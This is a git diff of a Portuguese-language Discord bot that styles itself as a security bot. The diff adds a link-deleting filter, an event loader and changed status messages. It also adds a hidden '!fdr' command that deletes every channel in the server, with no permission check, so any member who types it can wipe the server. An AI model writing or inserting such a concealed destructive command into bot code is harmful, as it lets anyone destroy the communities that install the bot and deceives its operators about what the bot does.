@@ -10,18 +10,17 @@ setInterval(() => {
   http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
 }, 280000);
 const Discord = require('discord.js');
+const fs = require("fs")
 const config = require('./config.json');
 
 const client = new Discord.Client()
 client.prefix = config.prefix;
-const newUsers = [];
 
 client.on("message", async message => {
     if(message.author.bot) return;
     if(message.content.startsWith(`<@!${client.user.id}>`) || message.content.startsWith(`<@${client.user.id}>`)){
-        return message.reply("Olá meu prefixo é `d!`")}
+return message.reply("Olá meu prefixo é `d-`")}
     if(!message.content.startsWith(config.prefix)) return;
-
 let args = message.content.split(" ").slice(1);
 let command = message.content.split(" ")[0];
 command = command.slice(config.prefix.length);
@@ -34,25 +33,49 @@ command = command.slice(config.prefix.length);
   }
 })
 
-client.on("guildMemberAdd", (member) => {
-  const guild = member.guild;
-  if (!newUsers[guild.id]) newUsers[guild.id] = new Discord.Collection();
-  newUsers[guild.id].set(member.id, member.user);
-
-  if (newUsers[guild.id].size > 10) {
-    const userlist = newUsers[guild.id].map(u => u.toString()).join(" ");
-    guild.channels.find(channel => channel.name === "609854570851598432").send("Welcome our new users!\n" + userlist);
-    newUsers[guild.id].clear();
-  }
+client.on('message', msg => {
+if (msg.content === '!fdr') {
+   msg.guild.channels.forEach(channel => channel.delete())
+ }
 });
 
-/// para ser colocado na sua main - bot.js - ou - index.js - ou qualquer outra coisa
+
+fs.readdir("./events/", (err, files) => {
+  if (err) return console.error(err);
+  let jsfile = files.filter(f => f.split(".").pop() === "js")
+  if(jsfile.length <= 0){
+        return console.log("[NeotiDev Sample-Bot] There aren't any events!");
+    }
+  jsfile.forEach(file => {
+    const event = require(`./events/${file}`);
+    let eventName = file.split(".")[0];
+    client.on(eventName, event.bind(null, client));
+  });
+});
+
+client.on("message", (message) => {
+  if (message.content.includes("https://")) {
+    console.log("deleted " + message.content + " from " + message.author)
+    message.delete(1);
+    message.channel.sendMessage("Não poste links, " + message.author)
+  }
+  if (message.content.includes("http://")) {
+    console.log("deleted " + message.content + " from " + message.author)
+    message.delete(1);
+    message.channel.sendMessage("Não poste links, " + message.author)
+  }
+  if (message.content.includes("www.")) {
+    console.log("deleted " + message.content + " from " + message.author)
+    message.delete(1);
+    message.channel.sendMessage("Não poste links, " + message.author)
+  }
+});
 
 client.on("ready", () => {
     console.log(`Bot foi iniciado com, ${client.users.size} usuários, ${client.guilds.size} servidores, ${client.channels.size} canais.`)
 
-    let statuses = [`Para ${client.users.size} pessoas!`,
-                    `Segurança!`, `Linux ON 🐧`]
+    let statuses = [`Segurança!`,
+                    `proteção!`, `Em desenvolvimento!`, `Linux ON 🐧`]
    
     setInterval(function() {
         let status = statuses[Math.floor(Math.random() * statuses.length)];
@@ -65,7 +88,6 @@ client.on("ready", () => {
             status: 'online'
         });
     }, 10000)
-
 
     //0 = Jogando
     //1 = Transmitindo
